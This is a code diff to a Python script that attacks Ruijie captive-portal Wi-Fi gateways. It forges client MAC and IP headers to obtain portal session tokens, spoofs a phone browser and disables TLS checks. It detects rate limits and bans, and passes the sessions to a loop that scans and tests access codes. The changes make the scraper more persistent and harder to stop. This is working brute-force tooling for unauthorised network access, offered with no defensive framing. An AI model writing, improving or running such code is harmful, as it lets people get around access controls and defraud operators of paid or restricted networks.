@@ -290,15 +290,16 @@ async def _get_with_redirects(session, url, headers, allow_redirects=True):
                [h.headers.get("Location", "") for h in r.history]
         return r.status, str(r.url), body, hist
 
-async def fetch_real_session(session, gw_params, mac, ip, retries=1):
+async def fetch_real_session(session, gw_params, mac, ip, retries=2):
     errors = []
     base_candidates = []
     primary = gw_params.get("url", RUIJIE_BASE).rstrip("/")
-    base_candidates.append(primary)
-    if primary != RUIJIE_MM_BASE:
+    if "portal-mm" in primary:
         base_candidates.append(RUIJIE_MM_BASE)
-    if primary != RUIJIE_BASE:
         base_candidates.append(RUIJIE_BASE)
+    else:
+        base_candidates.append(RUIJIE_BASE)
+        base_candidates.append(RUIJIE_MM_BASE)
 
     mac = mac.lower()
 
@@ -314,26 +315,64 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=1):
             url = f"{base_full}?{qs}"
 
             headers = {
-                "User-Agent": ("Mozilla/5.0 (Linux; Android 14; SM-S911B) "
-                               "AppleWebKit/537.36 (KHTML, like Gecko) "
-                               "Chrome/120.0.0.0 Mobile Safari/537.36"),
+                "User-Agent": (f"Mozilla/5.0 (Linux; Android 14; SM-S911B) "
+                               f"AppleWebKit/537.36 (KHTML, like Gecko) "
+                               f"Chrome/120.0.0.0 Mobile Safari/537.36"),
                 "Accept": ("text/html,application/xhtml+xml,application/xml;"
                            "q=0.9,image/webp,*/*;q=0.8"),
                 "Accept-Language": "en-US,en;q=0.9",
                 "Client-Mac": mac,
                 "X-Forwarded-For": ip,
-                "Connection": "keep-alive",
+                "Connection": "close",
                 "Upgrade-Insecure-Requests": "1",
                 "Referer": base + "/",
             }
 
             try:
+                try:
+                    session.cookie_jar.clear()
+                except Exception:
+                    pass
+
+                async with session.get(url, headers=headers, timeout=12,
+                                       allow_redirects=False, ssl=False) as r1:
+                    loc = r1.headers.get("Location", "") or ""
+                    loc_low = loc.lower()
+
+                    if r1.status == 429 or any(x in loc_low for x in (
+                        "request limited", "too many", "banned", "ip limit", "rate limit"
+                    )):
+                        errors.append(f"429/lim@{base[-18:]}")
+                        await asyncio.sleep(2.5)
+                        return ("BAN", "429/limited")
+
+                    sid, sign, ts = _extract_from_url(loc)
+                    if not sid:
+                        sid = _find_first(SESSION_PATTERNS, loc)
+                        if not sign:
+                            sign = _find_first(SIGN_PATTERNS, loc)
+                        if not ts:
+                            ts = _find_first(TS_PATTERNS, loc)
+
+                    if sid and len(sid) >= 16:
+                        final_u = urljoin(base_full, loc) if loc else base_full
+                        return ("REAL", {
+                            "sessionId": sid,
+                            "sign": sign,
+                            "timestamp": ts,
+                            "logonUrl": final_u,
+                            "url_base": base,
+                            "mac": mac,
+                            "ip": ip,
+                            "acquired": time.time(),
+                        })
+
                 status, final_url, body, hist = await _get_with_redirects(
                     session, url, headers, allow_redirects=True)
 
                 if status == 429:
-                    errors.append(f"429@{base[-20:]}")
-                    await asyncio.sleep(3.5)
+                    errors.append(f"429@{base[-18:]}")
+                    await asyncio.sleep(2.5)
                     return ("BAN", "429")
 
                 low = (body or "").lower()
@@ -343,7 +382,6 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=1):
                     return ("BAN", "limited")
 
                 sid, sign, ts = _extract_session(body, final_url, hist)
-
                 if sid and len(sid) >= 16:
                     return ("REAL", {
                         "sessionId": sid,
@@ -366,7 +404,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=1):
                 errors.append(f"err:{type(e).__name__}")
 
         if attempt < retries - 1:
-            await asyncio.sleep(0.4)
+            await asyncio.sleep(0.5)
 
     return ("FAIL", "|".join(errors[:3]) or "no-session")
 async def test_code(session, sess, code, mac, ip):
@@ -566,7 +604,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     async def _fetch_one():
         nonlocal mac, ip
         try:
-            tag, payload = await fetch_real_session(session, gw_params, mac, ip, retries=1)
+            tag, payload = await fetch_real_session(session, gw_params, mac, ip, retries=2)
             return tag, payload
         except Exception as e:
             return ("FAIL", f"exc:{type(e).__name__}")
